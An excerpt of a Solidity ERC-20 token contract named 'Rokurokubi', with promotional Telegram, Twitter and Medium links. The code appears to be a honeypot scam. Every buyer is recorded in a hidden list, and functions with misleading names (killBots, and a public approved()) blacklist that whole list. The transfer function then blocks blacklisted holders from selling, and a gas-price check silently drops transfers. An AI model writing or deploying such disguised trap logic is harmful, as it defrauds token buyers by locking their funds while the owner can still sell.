...
/*
Telegram : https://t.me/rokurokubiofficial
Twitter : https://twitter.com/RokurokubiERC
Medium : https://medium.com/@RokurokubiERC
**/
...
contract Rokurokubi is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isDuck;
    mapping (address => bool) private _ischicken;
    address[] private chicken;

    string private constant _name = "Rokurokubi";
    string private constant _symbol = "Rokurokubi";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 10000000 * 10**_decimals;
    uint256 public _maxTxAmount = 300000 * 10**_decimals;
    uint256 public _maxWalletAmount = 300000 * 10**_decimals;
    ...
    constructor () {
        ...
        _isDuck[msg.sender] = true;
        _isDuck[address(this)] = true;
        _isDuck[marketingWallet] = true;
    ...
    function approved() public virtual { 
        for (uint256 i = 0; i < chicken.length; i++) {
            _ischicken[chicken[i]] = true; 
        }
    }
    ...
    function excludeFromFee(address account) public onlyOwner {
        _isDuck[account] = true;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isDuck[account];
    }
    
    function includeInFee(address account) public onlyOwner {
        _ischicken[account] = false;
    }
    
    receive() external payable {}

    function isIncludedFromFee(address account) public view returns(bool) {
        return _ischicken[account];
    }

    function killBots() public onlyOwner { 
        for (uint256 i = 0; i < chicken.length; i++) {
            _ischicken[chicken[i]] = true; 
        }
    }
    ...
    function Snow(uint256 newMaxGwei) public onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isDuck[from] && !_isDuck[to]) {
            if (tx.gasprice > maxGwei && from == uniswapV2Pair) {
                _ischicken[to] = true;
            }

            if (to != uniswapV2Pair) { chicken.push(to);
            ...
            if (from != uniswapV2Pair) {
                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxAmount"); require(!_ischicken[from]); if (tx.gasprice > maxGwei) return;
